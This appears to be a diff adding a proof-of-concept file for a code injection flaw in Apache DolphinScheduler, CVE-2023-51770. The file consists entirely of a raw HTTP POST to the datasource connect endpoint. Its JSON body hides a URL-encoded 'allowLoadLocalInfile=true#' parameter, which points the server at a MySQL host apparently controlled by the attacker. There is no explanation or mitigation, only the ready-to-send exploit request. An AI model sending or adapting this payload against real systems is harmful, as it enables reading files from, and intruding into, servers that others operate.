@@ -1,0 +1,17 @@
+# Apache DolphinScheduler 代码注入漏洞（CVE-2023-51770）
+POST /dolphinscheduler/datasources/connect HTTP/1.1
+Host: www.xwd_test.com
+Content-Length: 407
+Accept: application/json, text/plain, */*
+sessionId: 338d2a47-ed61-4fc5-9868-5c8b0c57dec5
+language: zh_CN
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Origin: http://172.18.178.167:12345
+Referer: http://172.18.178.167:12345/dolphinscheduler/ui/datasource
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: securityConfigType=PASSWORD; sessionId=338d2a47-ed61-4fc5-9868-5c8b0c57dec5; language=zh_CN; sessionId=338d2a47-ed61-4fc5-9868-5c8b0c57dec5
+Connection: close
+
+{"type":"MYSQL","label":"MYSQL","name":"t2","note":"","host":"172.18.176.1","port":3308,"principal":"","javaSecurityKrb5Conf":"","loginUserKeytabUsername":"","loginUserKeytabPath":"","mode":"","userName":"c","password":"","database":"d","connectType":"","other":{"%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=%74%72%75%65#":"a"},"endpoint":"","MSIClientId":"","dbUser":"","datawarehouse":""}
